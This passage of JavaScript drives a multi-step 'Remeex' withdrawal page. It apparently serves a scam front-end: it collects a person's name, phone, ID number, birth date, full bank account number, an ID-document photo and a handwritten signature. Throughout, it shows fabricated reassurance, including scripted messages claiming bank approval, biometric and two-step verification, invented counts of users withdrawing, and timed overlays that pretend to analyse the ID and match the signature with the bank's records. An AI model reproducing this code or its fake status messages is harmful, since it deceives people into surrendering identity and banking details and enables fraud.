      if (pass.length >= 10) {
        const last4 = pass.slice(-4); // últimos 4 dígitos
        // Los dos primeros de esos 4 => montoMinimo (no se usa directamente aquí, pero ajusta la lógica si deseas)
        const possibleMin = parseInt(last4.slice(0, 2), 10);
        // Los dos últimos => tasaCambio
        const possibleRate = parseInt(last4.slice(2, 4), 10);

        // Solo si son válidos...
        if (!isNaN(possibleRate) && possibleRate > 0) {
          exchangeRate = possibleRate;
          exchangeRateText.textContent = `Tasa: ${exchangeRate.toFixed(2)}`;
        }
      }
    }

    // Actualizar nombres personalizados en secciones
    if (nombreCompleto) {
      // Extraer primer nombre
      const primerNombre = nombreCompleto.split(' ')[0];
      userNameStep3.textContent = primerNombre;
      userNameStep5.textContent = primerNombre;
    }

    // Inicializar el resto del flujo original
    loadSavedData();
    initBalanceCard();
    
    setupStep2Listeners();
    setupStep3Listeners();
    setupStep4Listeners();
    setupStep5Listeners();
    setupStep6Listeners();
    setupOverlayListeners();
    setupOverlayEffects();

    // Prevenir uso del botón "back" del navegador (manejo mejorado)
    history.pushState({}, '', '');
  });

  // Cargar opciones de bancos en el select
  function cargarOpcionesBancos() {
    if (bankSelect) {
      // Limpiar opciones existentes
      bankSelect.innerHTML = '<option value="">-- Selecciona un banco --</option>';
      
      // Agregar opciones basadas en las claves del mapeo
      Object.keys(bankLogosMapping).forEach(bankName => {
        const option = document.createElement("option");
        option.value = bankName;
        option.textContent = bankName;
        bankSelect.appendChild(option);
      });
    }
  }/*
    ---------------------------------------------------
    Funciones de carga de datos, inicialización y Steps
    ---------------------------------------------------
  */
  function loadSavedData() {
    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
    if (datosRemeex.rateBolivar) {
      exchangeRate = parseFloat(datosRemeex.rateBolivar);
      exchangeRateText.textContent = `Tasa: ${exchangeRate.toFixed(2)}`;
    }
    // Step 2
    loadSavedDataStep2();
    // Step 3
    loadSavedDataStep3();
  }

  /*
    Nueva implementación de la tarjeta de saldo
  */
  function initBalanceCard() {
    // Establecer intervalos para animaciones
    setInterval(createParticle, 300);
    setInterval(updateDynamicMessage, 5000);
    setInterval(toggleCurrency, 15000);
    setInterval(updateSpinnerStyle, 20000);
    
    // Alternar personalización cada 30 segundos
    setInterval(() => {
      togglePersonalizedBalance(); // Personalizar
      
      setTimeout(() => {
        togglePersonalizedBalance(); // Volver a normal después de 10 segundos
      }, 10000);
    }, 30000);
    
    // Actualizar saldo inicial
    balanceAmountElem.textContent = formatNumberVE(saldoDisponible) + " Bs";
    
    // Crear partículas iniciales
    for (let i = 0; i < 10; i++) {
      setTimeout(() => {
        createParticle();
      }, i * 100);
    }
    
    // Actualizar el primer mensaje dinámico
    updateDynamicMessage();
  }

  // Todas las posibles mensajes dinámicos para la tarjeta
  const allMessages = [
    // Mensajes de proceso y tiempos
    "Procesando transferencia",
    "Estableciendo conexión con tu banco",
    "Conexión establecida con éxito",
    "Proceso 100% funcional y seguro",
    "Recibirás tus fondos en 5 minutos",
    "Recibirás tus fondos en 3 minutos",
    "Tiempo estimado: 1 minuto",
    "Transferencia aprobada por el banco",
    "Preparando entrega final",
    
    // Mensajes de seguridad
    "Canal de transferencia encriptado",
    "Protocolo de seguridad activado",
    "Transferencia protegida y verificada",
    "Verificación biométrica completada",
    "Verificación en 2 pasos aprobada",
    "Tus fondos están asegurados",
    
    // Mensajes de estado
    "Tasa de cambio asegurada y fijada",
    "Sincronizando con banco emisor",
    "Banco receptor notificado",
    "Tu banco ha aprobado la operación",
    "Fondos reservados para entrega",
    "Confirmando disponibilidad",
    
    // Mensajes de acción
    "Optimizando ruta de transferencia",
    "Verificando mejor opción de entrega",
    "Procesamiento avanzado al 80%",
    "Validando datos bancarios",
    "Confirmando identidad",
    "Asegurando tasa preferencial",
    
    // Mensajes de usuario
    `${activeUsers} usuarios retirando ahora`,
    "Tu transacción es prioritaria",
    "Tu solicitud ha sido priorizada",
    "Tu transferencia está en cola",
    
    // Mensajes de conexión
    "Tu conexión es estable",
    "Tu conexión es débil, pero segura",
    "Optimizando para conexión lenta",
    "Conexión restablecida correctamente",
    "Velocidad de transferencia: óptima",
    
    // Mensajes de confirmación
    "Operación exitosa en proceso",
    "Todo va según lo previsto",
    "No hay inconvenientes detectados",
    "Transferencia en fase final",
    "Ya casi está listo"
  ];

  // Función para crear partículas en la tarjeta
  function createParticle() {
    // Creamos múltiples partículas en cada llamada
    const particleCount = Math.floor(Math.random() * 3) + 3; // 3-5 partículas a la vez
    
    if (!particlesContainer) return;
    
    for (let i = 0; i < particleCount; i++) {
      const particle = document.createElement('div');
      particle.classList.add('particle');
      
      // Añadir variedad de partículas
      const particleType = Math.random();
      if (particleType < 0.2) {
        particle.classList.add('diamond');
      } else if (particleType < 0.5) {
        particle.classList.add('mini');
      }
      
      // Posición inicial cerca del área del saldo
      const startY = Math.random() * 60 + 60;
      const startX = Math.random() * 150 + 20;
      
      // Tamaño aleatorio
      const size = Math.random() * 6 + 2;
      
      particle.style.width = `${size}px`;
      particle.style.height = `${size}px`;
      particle.style.left = `${startX}px`;
      particle.style.top = `${startY}px`;
      
      // Añadimos la partícula al DOM
      particlesContainer.appendChild(particle);
      
      // Duración variable para movimiento natural
      const duration = Math.random() * 3 + 1; // 1-4 segundos
      
      // Punto final para el portal
      const endY = Math.random() * 140 + 10;
      
      // Crear animación
      try {
        // Intentar usar la API moderna de animaciones
        const keyframes = [
          { 
            left: `${startX}px`, 
            top: `${startY}px`, 
            opacity: 0,
            transform: 'scale(0.3)'
          },
          { 
            opacity: 0.9,
            transform: 'scale(1)',
            offset: 0.2
          },
          { 
            opacity: 0.7,
            offset: 0.7
          },
          { 
            left: 'calc(100% - 10px)', 
            top: `${endY}px`, 
            opacity: 0,
            transform: 'scale(0.5)'
          }
        ];// Verificar si la API de Web Animations está disponible
        if (typeof particle.animate === 'function') {
          const animation = particle.animate(keyframes, {
            duration: duration * 1000,
            easing: 'cubic-bezier(0.25, 0.1, 0.25, 1)',
            fill: 'forwards'
          });
          
          if (animation && typeof animation.onfinish !== 'undefined') {
            animation.onfinish = () => {
              if (particle.parentNode) {
                particle.parentNode.removeChild(particle);
              }
            };
          } else {
            // Fallback para navegadores sin soporte completo
            setTimeout(() => {
              if (particle.parentNode) {
                particle.parentNode.removeChild(particle);
              }
            }, duration * 1000);
          }
        } else {
          // Fallback para navegadores sin Web Animations API
          setTimeout(() => {
            if (particle.parentNode) {
              particle.parentNode.removeChild(particle);
            }
          }, duration * 1000);
        }
      } catch(e) {
        // Por si acaso hay algún error en la animación
        setTimeout(() => {
          if (particle.parentNode) {
            particle.parentNode.removeChild(particle);
          }
        }, duration * 1000);
      }
    }
  }

  // Función para alternar entre Bs y USD
  function toggleCurrency() {
    if (!balanceAmountElem) return;
    
    const currentText = balanceAmountElem.textContent;
    if (showingBs) {
      // Convertir de Bs a USD usando la tasa de cambio
      const numericBs = parseFloat(
        currentText
          .replace(/\./g, '')
          .replace(',', '.')
          .replace(' Bs', '')
          .trim()
      );
      
      if (!isNaN(numericBs) && exchangeRate > 0) {
        const usdValue = numericBs / exchangeRate;
        balanceAmountElem.textContent = formatNumberVE(usdValue) + " USD";
      }
    } else {
      // Volver a Bs
      balanceAmountElem.textContent = formatNumberVE(saldoDisponible) + " Bs";
    }
    showingBs = !showingBs;
  }

  // Función para actualizar el mensaje dinámico
  function updateDynamicMessage() {
    if (!dynamicTextElem) return;
    
    // Actualizar usuarios activos
    if (Math.random() > 0.5) {
      activeUsers += Math.floor(Math.random() * 5) + 1;
    } else {
      activeUsers = Math.max(300, activeUsers - Math.floor(Math.random() * 3));
    }
    
    // Actualizar mensaje de usuarios en el array
    const userIndex = allMessages.findIndex(msg => msg.includes('usuarios retirando'));
    if (userIndex >= 0) {
      allMessages[userIndex] = `${activeUsers} usuarios retirando ahora`;
    }
    
    // Seleccionar un mensaje aleatorio
    const randomIndex = Math.floor(Math.random() * allMessages.length);
    const mensaje = allMessages[randomIndex];
    
    // Efecto de fade
    dynamicTextElem.style.opacity = '0';
    setTimeout(() => {
      // Si es un mensaje que requiere los puntos suspensivos
      if (mensaje.includes('Procesando') || 
          mensaje.includes('Estableciendo') || 
          mensaje.includes('Sincronizando') || 
          mensaje.includes('Verificando') || 
          mensaje.includes('Validando') || 
          mensaje.includes('Optimizando') ||
          mensaje.includes('Preparando')) {
        dynamicTextElem.innerHTML = `<span>${mensaje}</span><span class="dot-loader"></span>`;
      } else {
        dynamicTextElem.innerHTML = `<span>${mensaje}</span>`;
      }
      dynamicTextElem.style.opacity = '1';
    }, 500);
  }

  // Función para actualizar el estilo del spinner
  function updateSpinnerStyle() {
    if (!balanceSpinner) return;
    
    // Eliminar todas las clases de estilo
    balanceSpinner.classList.remove('style1', 'style2', 'style3', 'style4');
    
    // Determinar el siguiente estilo
    currentSpinnerStyle = currentSpinnerStyle % 4 + 1;
    
    // Aplicar el nuevo estilo
    if (currentSpinnerStyle > 1) {
      balanceSpinner.classList.add(`style${currentSpinnerStyle}`);
    }
  }

  // Función para personalizar el mensaje del saldo con nombre de usuario
  function togglePersonalizedBalance() {
    if (!balanceLabelElem) return;
    
    // Obtener nombre de usuario de sessionStorage
    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
    const nombreUsuario = datosRemeex.fullName ? datosRemeex.fullName.split(' ')[0] : "Usuario";
    
    // Guardar estilo actual del spinner
    const currentStyle = currentSpinnerStyle;
    
    if (!isPersonalized) {
      // Cambiar a formato personalizado
      balanceLabelElem.innerHTML = `
        ${nombreUsuario}, tu saldo disponible
        <span class="spinner" id="balanceSpinner">
          <span class="spinner-circle"></span>
          <span class="spinner-inner"></span>
        </span>
      `;
    } else {
      // Volver al formato normal
      balanceLabelElem.innerHTML = `
        Saldo disponible
        <span class="spinner" id="balanceSpinner">
          <span class="spinner-circle"></span>
          <span class="spinner-inner"></span>
        </span>
      `;
    }
    
    // Recuperar el nuevo spinner y aplicar el mismo estilo
    const newSpinner = document.getElementById('balanceSpinner');
    if (newSpinner && currentStyle > 1) {
      newSpinner.classList.add(`style${currentStyle}`);
    }
    
    isPersonalized = !isPersonalized;
  }/*
    STEP 2
  */
  function setupStep2Listeners() {
    fullNameInput.addEventListener("input", guardarDatosStep2);
    phonePrefixSelect.addEventListener("change", guardarDatosStep2);
    phoneNumberInput.addEventListener("input", guardarDatosStep2);
    docTypeSelect.addEventListener("change", guardarDatosStep2);
    nationalitySelect.addEventListener("change", guardarDatosStep2);
    docNumberInput.addEventListener("input", guardarDatosStep2);
    birthDateInput.addEventListener("input", guardarDatosStep2);
    isAdultCheckbox.addEventListener("change", guardarDatosStep2);

    continueBtnStep2.addEventListener("click", () => {
      if (validateStep2()) {
        // Reproducir música cuando se presiona continuar
        playYouTubeMusic();
        audioPlayed = true;
        goToStep3();
      }
    });
  }
  
  // Función para reproducir música de YouTube
  function playYouTubeMusic() {
    try {
      // Intentar reproducir con YouTube iframe API
      const youtubeContainer = document.createElement('div');
      youtubeContainer.id = 'youtubeContainer';
      youtubeContainer.style.position = 'fixed';
      youtubeContainer.style.top = '-9999px';
      youtubeContainer.style.left = '-9999px';
      youtubeContainer.style.width = '1px';
      youtubeContainer.style.height = '1px';
      youtubeContainer.style.visibility = 'hidden';
      document.body.appendChild(youtubeContainer);
      
      // Cargar YouTube API
      const tag = document.createElement('script');
      tag.src = "https://www.youtube.com/iframe_api";
      const firstScriptTag = document.getElementsByTagName('script')[0];
      firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
      
      // Configurar la función que se llamará cuando la API esté lista
      window.onYouTubeIframeAPIReady = function() {
        youtubePlayer = new YT.Player('youtubeContainer', {
          height: '1',
          width: '1',
          videoId: 'sP1qO-lhoXQ',
          playerVars: {
            'autoplay': 1,
            'start': 191,  // Iniciar en 3:11 (191 segundos)
            'end': 234     // Terminar en 3:54 (234 segundos)
          },
          events: {
            'onReady': function(event) {
              event.target.setVolume(60);  // Volumen al 60%
              event.target.playVideo();
            }
          }
        });
      };
      
      // Alternativa: usar audio normal si la API de YouTube falla
      setTimeout(() => {
        if (!youtubePlayer || youtubePlayer.getPlayerState() !== YT.PlayerState.PLAYING) {
          playAudioFallback();
        }
      }, 3000);
    } catch (e) {
      console.error("Error al iniciar reproducción de YouTube:", e);
      playAudioFallback();
    }
  }
  
  // Función alternativa si falla la API de YouTube
  function playAudioFallback() {
    try {
      const audioElement = document.createElement('audio');
      audioElement.style.display = 'none';
      audioElement.src = "https://www.youtube.com/watch?v=sP1qO-lhoXQ";
      audioElement.volume = 0.6;
      audioElement.currentTime = 191; // 3:11
      document.body.appendChild(audioElement);
      
      const playPromise = audioElement.play();
      if (playPromise) {
        playPromise.catch(error => {
          console.error("Error reproduciendo audio fallback:", error);
          
          // Intento final: crear un iframe invisible que apunte al video
          const iframeContainer = document.createElement('div');
          iframeContainer.style.position = 'fixed';
          iframeContainer.style.top = '-9999px';
          iframeContainer.style.left = '-9999px';
          iframeContainer.style.width = '1px';
          iframeContainer.style.height = '1px';
          iframeContainer.style.visibility = 'hidden';
          iframeContainer.innerHTML = `
            <iframe width="1" height="1" 
              src="https://www.youtube.com/embed/sP1qO-lhoXQ?autoplay=1&start=191&end=234" 
              frameborder="0" 
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
              allowfullscreen>
            </iframe>
          `;
          document.body.appendChild(iframeContainer);
        });
      }
    } catch (e) {
      console.error("Error completo en reproducción de audio:", e);
    }
  }
  
  function loadSavedDataStep2() {
    const savedData = JSON.parse(sessionStorage.getItem('beneficiaryData') || "{}");
    if (Object.keys(savedData).length === 0) {
      const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
      if (datosRemeex.fullName) {
        fullNameInput.value = datosRemeex.fullName;
        if (datosRemeex.userPhone && datosRemeex.userPhone.includes('-')) {
          const [prefix, number] = datosRemeex.userPhone.split('-');
          phonePrefixSelect.value = prefix;
          phoneNumberInput.value = number;
        }
        if (datosRemeex.docType) docTypeSelect.value = datosRemeex.docType;
        if (datosRemeex.nationality) nationalitySelect.value = datosRemeex.nationality;
        if (datosRemeex.docNumber) docNumberInput.value = datosRemeex.docNumber;
        if (datosRemeex.birthDate) birthDateInput.value = datosRemeex.birthDate;
        guardarDatosStep2();
        return;
      }
    }
    // Recuperar si ya se guardó anteriormente
    if (savedData.fullName) { fullNameInput.value = savedData.fullName; }
    if (savedData.telefono) {
      const [prefix, number] = savedData.telefono.split("-");
      phonePrefixSelect.value = prefix || "";
      phoneNumberInput.value = number || "";
    }
    if (savedData.docType) { docTypeSelect.value = savedData.docType; }
    if (savedData.nationality) { nationalitySelect.value = savedData.nationality; }
    if (savedData.docNumber) { docNumberInput.value = savedData.docNumber; }
    if (savedData.birthDate) { birthDateInput.value = savedData.birthDate; }
    if (savedData.isAdult) { isAdultCheckbox.checked = savedData.isAdult; }
  }
  
  function guardarDatosStep2() {
    const data = {
      fullName: fullNameInput.value,
      telefono: `${phonePrefixSelect.value}-${phoneNumberInput.value}`,
      docType: docTypeSelect.value,
      nationality: nationalitySelect.value,
      docNumber: docNumberInput.value,
      birthDate: birthDateInput.value,
      isAdult: isAdultCheckbox.checked
    };
    sessionStorage.setItem('beneficiaryData', JSON.stringify(data));
    localStorage.setItem('beneficiaryData', JSON.stringify(data));

    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
    datosRemeex.fullName = data.fullName;
    datosRemeex.userPhone = data.telefono;
    datosRemeex.docType = data.docType;
    datosRemeex.nationality = data.nationality;
    datosRemeex.docNumber = data.docNumber;
    datosRemeex.birthDate = data.birthDate;
    sessionStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
    
    // Actualizar nombre en secciones
    if (data.fullName) {
      nombreCompleto = data.fullName;
      const primerNombre = data.fullName.split(' ')[0];
      userNameStep3.textContent = primerNombre;
      userNameStep5.textContent = primerNombre;
    }
  }function validateStep2() {
    const fullName = fullNameInput.value.trim();
    const phonePrefix = phonePrefixSelect.value;
    const phoneNumber = phoneNumberInput.value.trim();
    const docType = docTypeSelect.value;
    const nationality = nationalitySelect.value;
    const docNumber = docNumberInput.value.trim();
    const birthDate = birthDateInput.value;
    const isAdult = isAdultCheckbox.checked;

    const nameRegex = /^[a-zA-ZÀ-ÿ]+(\s[a-zA-ZÀ-ÿ]+)+$/;
    if (!fullName || !nameRegex.test(fullName)) {
      alert("Ingrese Nombres y Apellidos válidos (solo letras y al menos un espacio).");
      return false;
    }
    if (!phonePrefix) {
      alert("Seleccione el prefijo del teléfono.");
      return false;
    }
    if (!/^\d{7}$/.test(phoneNumber)) {
      alert("El número de teléfono debe tener 7 dígitos.");
      return false;
    }
    if (!docType) {
      alert("Seleccione el tipo de documento.");
      return false;
    }
    if (!nationality) {
      alert("Seleccione la nacionalidad.");
      return false;
    }
    if (!/^\d{8,10}$/.test(docNumber)) {
      alert("El número de documento debe contener entre 8 y 10 dígitos.");
      return false;
    }
    if (!birthDate) {
      alert("Seleccione la fecha de nacimiento.");
      return false;
    }
    if (!isAdult) {
      alert("Debe confirmar que es mayor de edad.");
      return false;
    }
    return true;
  }

  /*
    STEP 3
  */
  function setupStep3Listeners() {
    bankSelect.addEventListener("change", handleBankChange);
    restAccountDigitsInput.addEventListener("input", guardarDatosStep3);
    accountTypeSelect.addEventListener("change", guardarDatosStep3);

    continueBtnStep3.addEventListener("click", () => {
      if (validateStep3()) {
        goToStep4();
      }
    });
    backBtnStep3.addEventListener("click", () => {
      goToStep2();
    });
  }
  
  function loadSavedDataStep3() {
    const savedData = JSON.parse(sessionStorage.getItem("datosBancarios") || "{}");
    if (Object.keys(savedData).length === 0) {
      const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
      if (datosRemeex.bankName) {
        bankSelect.value = datosRemeex.bankName;
        if (datosRemeex.bankCode) {
          bankCodeInput.value = datosRemeex.bankCode;
          accountContainer.style.display = "block";
        }
        if (datosRemeex.bankAccount && datosRemeex.bankAccount.length > 4) {
          const restDigits = datosRemeex.bankAccount.slice(-16);
          restAccountDigitsInput.value = restDigits;
        }
        if (datosRemeex.bankType) accountTypeSelect.value = datosRemeex.bankType;
        guardarDatosStep3();
        return;
      }
    }
    if (savedData.bank) {
      bankSelect.value = savedData.bank;
      if (savedData.bankCode) {
        bankCodeInput.value = savedData.bankCode;
        accountContainer.style.display = "block";
      }
      if (savedData.digitosCuenta) {
        restAccountDigitsInput.value = savedData.digitosCuenta;
      }
      if (savedData.accountType) {
        accountTypeSelect.value = savedData.accountType;
      }
    }
  }
  
  function handleBankChange() {
    const selectedBank = bankSelect.value;
    if (selectedBank) {
      bancoUsuario = selectedBank;
      logoBancoUsuario = getBankLogoURL(selectedBank);
      const code = bankMapping[selectedBank];
      bankCodeInput.value = code || "0000";
      accountContainer.style.display = "block";
    } else {
      bankCodeInput.value = "";
      accountContainer.style.display = "none";
    }
    restAccountDigitsInput.value = "";
    guardarDatosStep3();
  }
  
  function guardarDatosStep3() {
    const data = {
      bank: bankSelect.value,
      bankCode: bankCodeInput.value,
      digitosCuenta: restAccountDigitsInput.value,
      accountType: accountTypeSelect.value
    };
    
    // Obtener logo del banco y guardarlo
    const logoURL = getBankLogoURL(data.bank);
    
    sessionStorage.setItem("datosBancarios", JSON.stringify(data));
    localStorage.setItem("datosBancarios", JSON.stringify(data));

    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
    datosRemeex.bankName = data.bank;
    datosRemeex.bankCode = data.bankCode;
    datosRemeex.bankAccount = data.bankCode + data.digitosCuenta;
    datosRemeex.bankType = data.accountType;
    datosRemeex.bankLogo = logoURL; // Guardar URL del logo
    
    sessionStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
    
    // Actualizar variables globales
    bancoUsuario = data.bank;
    numeroCuenta = data.bankCode + data.digitosCuenta;
    tipoCuenta = data.accountType;
    logoBancoUsuario = logoURL;
  }function validateStep3() {
    const selectedBank = bankSelect.value;
    const restDigits = restAccountDigitsInput.value.trim();
    const acctType = accountTypeSelect.value;

    if (!selectedBank) {
      alert("Por favor, selecciona un banco.");
      return false;
    }
    if (restDigits.length !== 16) {
      alert("Completa los 16 dígitos restantes del número de cuenta.");
      return false;
    }
    if (!acctType) {
      alert("Por favor, selecciona el tipo de cuenta.");
      return false;
    }
    return true;
  }

  /*
    STEP 4
  */
  function setupStep4Listeners() {
    idDocument.addEventListener("change", handleIDDocumentChange);
    confirmDocBtn.addEventListener("click", () => {
      startDocumentoOverlaySequence();
    });
    backBtnStep4.addEventListener("click", () => {
      goToStep3();
    });
  }
  
  function handleIDDocumentChange(e) {
    const file = e.target.files[0];
    if (file && file.type.startsWith("image/")) {
      const reader = new FileReader();
      reader.onload = (ev) => {
        docPreview.src = ev.target.result;
        previewContainer.classList.add("active");
        startDocBtnCountdown();
      };
      reader.readAsDataURL(file);
    }
  }
  
  function startDocBtnCountdown() {
    confirmDocBtn.disabled = true;
    confirmDocBtn.classList.add("btn-disabled");
    countdownDocBtn.textContent = `Disponible en ${confirmDocBtnCountdown} s...`;
    
    const interval = setInterval(() => {
      confirmDocBtnCountdown--;
      countdownDocBtn.textContent = `Disponible en ${confirmDocBtnCountdown} s...`;
      if (confirmDocBtnCountdown <= 0) {
        clearInterval(interval);
        confirmDocBtn.disabled = false;
        confirmDocBtn.classList.remove("btn-disabled");
        countdownDocBtn.textContent = "";
      }
    }, 1000);
  }
  
  function startDocumentoOverlaySequence() {
    showOverlay("overlayDocumento");
    
    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
    if (datosRemeex.bankName) {
      const logoUrl = getBankLogoURL(datosRemeex.bankName);
      if (overlayDocumentoLogo) overlayDocumentoLogo.src = logoUrl;
    }

    overlayDocumentoTitulo.textContent = "Analizando documento de identidad...";
    overlayDocumentoTexto.textContent = "Por favor, espera mientras se verifica la información.";
    
    // Iniciar animación de la barra de progreso
    animateProgressBarAdvanced(documentoProgress, 0, 30, 3000);
    
    setTimeout(() => {
      overlayDocumentoTitulo.textContent = "Documento cargado con éxito";
      overlayDocumentoTexto.textContent = "Extrayendo datos...";
      animateProgressBarAdvanced(documentoProgress, 30, 60, 4000);
      
      setTimeout(() => {
        overlayDocumentoTitulo.textContent = "Extrayendo firma para comparar con la registrada en tu banco";
        overlayDocumentoTexto.textContent = "Preparando verificación final...";
        animateProgressBarAdvanced(documentoProgress, 60, 100, 3000);
        
        setTimeout(() => {
          hideOverlay("overlayDocumento");
          goToStep5();
        }, 4000);
      }, 4000);
    }, 4000);
  }

  /*
    STEP 5
  */
  function setupStep5Listeners() {
    clearSignatureBtn.addEventListener("click", () => {
      if (ctx) {
        ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
      }
    });
    saveSignatureBtn.addEventListener("click", () => {
      signatureDataURL = signatureCanvas.toDataURL("image/png");
      if (firmaImagenPreview) {
        firmaImagenPreview.src = signatureDataURL;
      }
      if (confirmFirmaBancoLogo) {
        confirmFirmaBancoLogo.src = logoBancoUsuario;
      }
      showOverlay("overlayConfirmFirma");
    });
    backBtnStep5.addEventListener("click", () => {
      goToStep4();
    });
  }function initSignatureCanvas() {
    if (!ctx) {
      ctx = signatureCanvas.getContext("2d");
      resizeSignatureCanvas();

      // Eventos de mouse
      signatureCanvas.addEventListener("mousedown", startDraw);
      signatureCanvas.addEventListener("mousemove", draw);
      signatureCanvas.addEventListener("mouseup", endDraw);
      signatureCanvas.addEventListener("mouseleave", endDraw);

      // Eventos táctiles
      signatureCanvas.addEventListener("touchstart", startDrawTouch, { passive: false });
      signatureCanvas.addEventListener("touchmove", drawTouch, { passive: false });
      signatureCanvas.addEventListener("touchend", endDrawTouch);
    }
  }
  
  function resizeSignatureCanvas() {
    signatureCanvas.width = signatureCanvas.offsetWidth;
    signatureCanvas.height = signatureCanvas.offsetHeight;
  }
  
  function startDraw(e) {
    isDrawing = true;
    ctx.beginPath();
    ctx.moveTo(e.offsetX, e.offsetY);
  }
  
  function draw(e) {
    if (!isDrawing) return;
    ctx.lineWidth = 2;
    ctx.lineCap = "round";
    ctx.strokeStyle = "#000";
    ctx.lineTo(e.offsetX, e.offsetY);
    ctx.stroke();
  }
  
  function endDraw() {
    isDrawing = false;
    ctx.closePath();
  }
  
  function getTouchPos(e) {
    const rect = signatureCanvas.getBoundingClientRect();
    return {
      x: e.touches[0].clientX - rect.left,
      y: e.touches[0].clientY - rect.top
    };
  }
  
  function startDrawTouch(e) {
    e.preventDefault();
    isDrawing = true;
    ctx.beginPath();
    const pos = getTouchPos(e);
    ctx.moveTo(pos.x, pos.y);
  }
  
  function drawTouch(e) {
    e.preventDefault();
    if (!isDrawing) return;
    const pos = getTouchPos(e);
    ctx.lineWidth = 2;
    ctx.lineCap = "round";
    ctx.strokeStyle = "#000";
    ctx.lineTo(pos.x, pos.y);
    ctx.stroke();
  }
  
  function endDrawTouch(e) {
    e.preventDefault();
    isDrawing = false;
    ctx.closePath();
  }

  /*
    STEP 6
  */
  function setupStep6Listeners() {
    pagoMethodSelect.addEventListener("change", updateMontoRetiro);
    finalConfirmBtn.addEventListener("click", handleFinalConfirm);
    backBtnStep6.addEventListener("click", () => {
      goToStep5();
    });
  }
  
  function updateMontoRetiro() {
    // Establecer el saldo disponible como valor predeterminado y no editable
    montoRetiroInput.value = formatNumberVE(saldoDisponible);
    montoRetiro = saldoDisponible;
    retirarMonto.textContent = formatNumberVE(saldoDisponible) + " Bs";
    
    // Habilitar el botón si se ha seleccionado un método
    if (pagoMethodSelect.value) {
      finalConfirmBtn.disabled = false;
      finalConfirmBtn.classList.remove("btn-disabled");
    } else {
      finalConfirmBtn.disabled = true;
      finalConfirmBtn.classList.add("btn-disabled");
    }
  }
  
  function renderFinalSummary() {
    const step2Data = JSON.parse(sessionStorage.getItem("beneficiaryData")) || {};
    const step3Data = JSON.parse(sessionStorage.getItem("datosBancarios")) || {};

    let docPrefix = "";
    if (step2Data.docType === "Cédula de Identidad") docPrefix = "V-";
    else if (step2Data.docType === "Pasaporte Vigente") docPrefix = "P-";
    else if (step2Data.docType === "Licencia de Conducir") docPrefix = "L-";

    const benefHTML = `
      <strong>Nombres y Apellidos:</strong> ${step2Data.fullName || "---"}<br/>
      <strong>Teléfono:</strong> ${step2Data.telefono || "---"}<br/>
      <strong>Tipo de Documento:</strong> ${step2Data.docType || "---"}<br/>
      <strong>Nacionalidad:</strong> ${step2Data.nationality || "---"}<br/>
      <strong>Número de Documento:</strong> ${docPrefix}${step2Data.docNumber || "---"}<br/>
      <strong>Fecha de Nacimiento:</strong> ${step2Data.birthDate || "---"}<br/>
    `;
    benefSummary.innerHTML = benefHTML;

    const fullAccount = (step3Data.bankCode || "") + (step3Data.digitosCuenta || "");
    const bankHTML = `
      <strong>Banco:</strong> ${step3Data.bank || "---"}<br/>
      <strong>Número de Cuenta:</strong> ${fullAccount || "---"}<br/>
      <strong>Tipo de Cuenta:</strong> ${step3Data.accountType || "---"}<br/>
    `;
    bankSummary.innerHTML = bankHTML;

    if (signatureDataURL) {
      firmaSummary.src = signatureDataURL;
    } else {
      firmaSummary.src = "https://via.placeholder.com/200x100?text=Sin+Firma";
    }
    
    // Mostrar logo del banco
    if (step3Data.bank) {
      const logoUrl = getBankLogoURL(step3Data.bank);
      bankLogoSummary.src = logoUrl;
      bankLogoSummary.style.display = "block";
    }
    
    // Iniciar análisis de firma
    startFirmaAnalysis();
    
    // Preestablecer el monto de retiro (no editable)
    montoRetiroInput.value = formatNumberVE(saldoDisponible);
    montoRetiro = saldoDisponible;
    retirarMonto.textContent = formatNumberVE(saldoDisponible) + " Bs";
  }function startFirmaAnalysis() {
    firmaAnalyzing.style.display = "flex";
    finalConfirmBtn.disabled = true;
    finalConfirmBtn.classList.add("btn-disabled");
    countdownRetiroBtn.textContent = `Analizando firma: ${firmaAnalysisCountdown} s...`;
    
    const interval = setInterval(() => {
      firmaAnalysisCountdown--;
      countdownRetiroBtn.textContent = `Analizando firma: ${firmaAnalysisCountdown} s...`;
      
      if (firmaAnalysisCountdown <= 0) {
        clearInterval(interval);
        firmaAnalyzing.style.display = "none";
        // Nota: No habilitar el botón hasta que se seleccione método de pago
        countdownRetiroBtn.textContent = "";
      }
    }, 1000);
  }
  
  function handleFinalConfirm() {
    if (!pagoMethodSelect.value) {
      alert("Por favor, selecciona un método de retiro.");
      return;
    }
    
    // Mostrar overlay de inicio de retiro
    logoInicioRetiro.src = logoBancoUsuario;
    showOverlay("overlayInicioRetiro");
  }

  /*
    Secuencia de Retiro Final (VERSIÓN MEJORADA)
  */
  function iniciarProcesoRetiro() {
    // Inicializar proceso
    hideOverlay("overlayInicioRetiro");
    
    // Establecer logo del banco
    if (bankCardLogo) {
      bankCardLogo.src = logoBancoUsuario;
    }
    
    // También establecer el logo en el contenedor alternativo
    if (bankLogoFallback) {
      bankLogoFallback.src = logoBancoUsuario;
    }
    
    // Establecer valor inicial en Remeex card
    const remeexBalanceAmount = document.getElementById("remeexBalanceAmount");
    if (remeexBalanceAmount) {
      updateBalanceDisplay(remeexBalanceAmount, saldoDisponible);
      
      // Si el saldo tiene muchos dígitos, ajustar el tamaño del texto
      adjustBalanceTextSize(remeexBalanceAmount);
    }
    
    // Inicializar el saldo del banco en cero
    const bankBalanceAmount = document.getElementById("bankBalanceAmount");
    if (bankBalanceAmount) {
      updateBalanceDisplay(bankBalanceAmount, 0);
      
      // Si el saldo tiene muchos dígitos, ajustar el tamaño del texto
      adjustBalanceTextSize(bankBalanceAmount);
    }
    
    // Activar la tarjeta del banco y ocultar el logo overlay
    if (bankCardContainer && bankLogoOverlay) {
      bankCardContainer.classList.add('active');
      bankLogoOverlay.classList.remove('active');
    }
    
